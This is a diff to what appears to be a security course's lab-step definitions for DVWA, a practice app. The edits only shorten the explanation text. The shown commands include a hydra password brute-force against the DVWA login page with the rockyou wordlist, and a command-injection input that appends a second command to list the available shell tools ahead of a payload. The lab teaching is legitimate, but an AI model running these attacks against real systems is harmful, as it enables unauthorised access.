@@ -519,7 +519,7 @@ Table: users
           { cmd: '[ -f /usr/share/wordlists/rockyou.txt ] || sudo gunzip /usr/share/wordlists/rockyou.txt.gz', explain: 'Unzip rockyou the first time only — this line does nothing if it is already unzipped.' },
           {
             cmd: 'sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt <YOUR_TARGET_IP> -s 8080 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\\: PHPSESSID=<your_session_id>; security=low:F=Username and/or password incorrect" | tee ~/team-artifacts/week-3/Brute_Force_Proof.txt',
-            explain: 'Kali terminal: try every rockyou password for admin against the DVWA Brute Force page. It sends your logged-in cookie so the page answers, and keeps going until the "incorrect" failure text disappears. Replace <your_session_id> with your PHPSESSID.',
+            explain: 'Kali terminal: try every rockyou password for admin against the DVWA Brute Force page. It sends your cookie so the page answers, and stops when the "incorrect" text disappears.',
             flags: [
               { flag: 'hydra', meaning: 'Tries many login guesses quickly.' },
               { flag: '-l admin', meaning: 'The single username to try (lowercase L = one login name).' },
@@ -588,7 +588,7 @@ Table: users
           },
           {
             cmd: '127.0.0.1; which nc bash python3 php',
-            explain: '② In the browser, go to the DVWA Command Injection input field — run this FIRST. It prints which shells the container actually has, so you can pick a payload that will work. In a stock DVWA container usually only php prints a path.',
+            explain: '② In the DVWA Command Injection field, run this FIRST: it prints which shells the container actually has, so you pick a payload that works. Usually only php answers.',
             flags: [
               { flag: 'which nc bash python3 php', meaning: 'Shows the path of each tool that exists in the container (a blank line = not installed).' },
             ],
